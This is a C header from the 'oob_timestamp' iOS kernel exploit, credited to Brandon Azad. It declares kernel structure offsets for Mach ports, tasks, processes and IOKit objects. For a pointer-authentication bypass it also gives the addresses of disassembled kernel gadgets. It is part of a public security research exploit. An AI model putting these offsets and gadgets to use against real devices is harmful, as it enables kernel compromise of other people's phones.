/*
 * parameters.h
 * Brandon Azad
 */
#ifndef OOB_TIMESTAMP__PARAMETERS_H_
#define OOB_TIMESTAMP__PARAMETERS_H_

#include <stdbool.h>
#include <stddef.h>
#include <stdint.h>

#ifdef PARAMETERS_EXTERN
#define extern PARAMETERS_EXTERN
#endif


// Marks a parameter as a weak symbol, allowing multiple non-conflicting definitions.
#define PARAMETER_SHARED	__attribute__((weak))


// Generate the name for an offset.
#define OFFSET(base_, object_)		_##base_##__##object_##__offset_

// Generate the name for the size of an object.
#define SIZE(object_)			_##object_##__size_

// Generate the name for the address of an object.
#define ADDRESS(object_)		_##object_##__address_

// Generate the name for the static (unslid) address of an object.
#define STATIC_ADDRESS(object_)		_##object_##__static_address_


// A convenience macro for accessing a field of a structure.
#define FIELD(object_, struct_, field_, type_)	\
	( *(type_ *) ( ((uint8_t *) object_) + OFFSET(struct_, field_) ) )

// ---- oob_timestamp parameters ------------------------------------------------------------------

// Parameters for host.
extern size_t OFFSET(host, special);

// Parameters for ipc_entry.
extern size_t SIZE(ipc_entry);
extern size_t OFFSET(ipc_entry, ie_object);
extern size_t OFFSET(ipc_entry, ie_bits);

// Parameters for ipc_port.
extern size_t OFFSET(ipc_port, ip_bits);
extern size_t OFFSET(ipc_port, ip_references);
extern size_t OFFSET(ipc_port, ip_receiver);
extern size_t OFFSET(ipc_port, ip_kobject);
extern size_t OFFSET(ipc_port, ip_mscount);
extern size_t OFFSET(ipc_port, ip_srights);

// Parameters for struct ipc_space.
extern size_t OFFSET(ipc_space, is_table_size);
extern size_t OFFSET(ipc_space, is_table);
extern size_t OFFSET(ipc_space, is_task);

// Parameters for struct proc.
extern size_t OFFSET(proc, p_list_next);
extern size_t OFFSET(proc, p_list_prev);
extern size_t OFFSET(proc, task);
extern size_t OFFSET(proc, p_pid);

// Parameters for struct task.
extern size_t OFFSET(task, lck_mtx_type);
extern size_t OFFSET(task, lck_mtx_data);
extern size_t OFFSET(task, ref_count);
extern size_t OFFSET(task, active);
extern size_t OFFSET(task, map);
extern size_t OFFSET(task, itk_sself);
extern size_t OFFSET(task, itk_space);
extern size_t OFFSET(task, bsd_info);
extern size_t OFFSET(task, all_image_info_addr);
extern size_t OFFSET(task, all_image_info_size);

// Parameters for IOSurface.
extern size_t OFFSET(IOSurface, properties);

// Parameters for IOSurfaceClient.
extern size_t OFFSET(IOSurfaceClient, surface);

// Parameters for IOSurfaceRootUserClient.
extern size_t OFFSET(IOSurfaceRootUserClient, surfaceClients);

// Parameters for OSArray.
extern size_t OFFSET(OSArray, count);
extern size_t OFFSET(OSArray, array);

// Parameters for OSData.
extern size_t OFFSET(OSData, capacity);
extern size_t OFFSET(OSData, data);

// Parameters for OSDictionary.
extern size_t OFFSET(OSDictionary, count);
extern size_t OFFSET(OSDictionary, dictionary);

// Parameters for OSString.
extern size_t OFFSET(OSString, string);

/*
 * oob_timestamp_parameters_init
 *
 * Description:
 * 	Initialize the parameters for the oob_timestamp exploit.
 */
bool oob_timestamp_parameters_init(void);

// ---- kernel parameters -------------------------------------------------------------------------

// Parameters for struct ipc_entry.
extern size_t SIZE(ipc_entry);
extern size_t OFFSET(ipc_entry, ie_object);

// Parameters for struct ipc_port.
extern size_t OFFSET(ipc_port, ip_kobject);

// Parameters for struct ipc_space.
extern size_t OFFSET(ipc_space, is_table_size);
extern size_t OFFSET(ipc_space, is_table);

// Parameters for struct proc.
extern size_t OFFSET(proc, p_list_prev);
extern size_t OFFSET(proc, task);
extern size_t OFFSET(proc, p_pid);

// Parameters for struct task.
extern size_t OFFSET(task, itk_space);

// The static base address of the kernel image.
extern uint64_t STATIC_ADDRESS(kernel_base);

/*
 * kernel_parameters_init
 *
 * Description:
 * 	Initialize the parameters for the kernel subsystem.
 */
bool kernel_parameters_init(void);

// ---- PAC bypass parameters ---------------------------------------------------------------------

// Parameters for struct cpu_data.
extern size_t OFFSET(cpu_data, cpu_number);
extern size_t OFFSET(cpu_data, cpu_processor);
extern size_t OFFSET(cpu_data, cpu_int_state);

// Parameters for struct thread.
extern size_t OFFSET(thread, bound_processor);
extern size_t OFFSET(thread, contextData);
extern size_t OFFSET(thread, CpuDatap);

// 	FFFFFFF007CD0C6C                 BL              ml_sign_thread_state
// 	FFFFFFF007CD0C70                 MOV             X30, X8
// 	FFFFFFF007CD0C74                 B               loc_FFFFFFF007CD0CBC
extern uint64_t ADDRESS(thread_set_state__preemption_point_1);

// 	FFFFFFF007CD0D58                 BL              ml_sign_thread_state
// 	FFFFFFF007CD0D5C                 MOV             X30, X8
// 	FFFFFFF007CD0D60                 B               loc_FFFFFFF007CD0BF8
extern uint64_t ADDRESS(thread_set_state__preemption_point_2);

// 	FFFFFFF007CCFF20                 MOV             X6, X30
// 	FFFFFFF007CCFF24                 BL              ml_sign_thread_state
// 	FFFFFFF007CCFF28                 MOV             X30, X6
// 	FFFFFFF007CCFF2C                 RET
extern uint64_t ADDRESS(spinning_gadget);

// 	FFFFFFF007CD29A0                 MOV             X1, X9
// 	FFFFFFF007CD29A4                 STR             X1, [X0,#arm_context._pc]
// 	FFFFFFF007CD29A8                 BL              ml_sign_thread_state
// 	FFFFFFF007CD29AC                 MOV             X30, X8
// 	FFFFFFF007CD29B0                 RET
extern uint64_t ADDRESS(signing_gadget);
extern uint64_t ADDRESS(signing_gadget_end);

// 	FFFFFFF007CD1F38                 BL              handle_set_arm64_thread_state
// 	FFFFFFF007CD1F3C                 B               loc_FFFFFFF007CD2278
extern uint64_t ADDRESS(thread_set_state__preemption_resume);

// ml_sign_thread_state()
extern uint64_t ADDRESS(ml_sign_thread_state);

// exception_return
extern uint64_t ADDRESS(exception_return);

// 	FFFFFFF0081BFC94                 BR              X25
extern uint64_t ADDRESS(BR_X25);

// 	FFFFFFF008F7A290                 STR             X9, [X3]
// 	FFFFFFF008F7A294                 STR             X8, [X4]
// 	FFFFFFF008F7A298                 RET
extern uint64_t ADDRESS(STR_X9_X3__STR_X8_X4__RET);

// memmove()
extern uint64_t ADDRESS(memmove);

//	FFFFFFF0081BF938                 MOV             X30, X3
//	...
//	FFFFFFF0081BF9E4                 ERET
extern uint64_t ADDRESS(exception_return__unsigned);

// pthread_returning_to_userspace()
extern uint64_t ADDRESS(pthread_returning_to_userspace);

// thread_exception_return
extern uint64_t ADDRESS(thread_exception_return);

// 	FFFFFFF008E65780                 STR             X0, [X20]
// 	FFFFFFF008E65784                 LDP             X29, X30, [SP,#0x10+var_s0]
// 	FFFFFFF008E65788                 LDP             X20, X19, [SP+0x10+var_10],#0x20
// 	FFFFFFF008E6578C                 RETAB
extern uint64_t ADDRESS(STR_X0_X20__LDP_X29_X30_SP_10__RETAB);

/*
 * pac_bypass_parameters_init
 *
 * Description:
 * 	Initialize the parameters for the PAC bypass.
 */
bool pac_bypass_parameters_init(void);

#undef extern

#endif
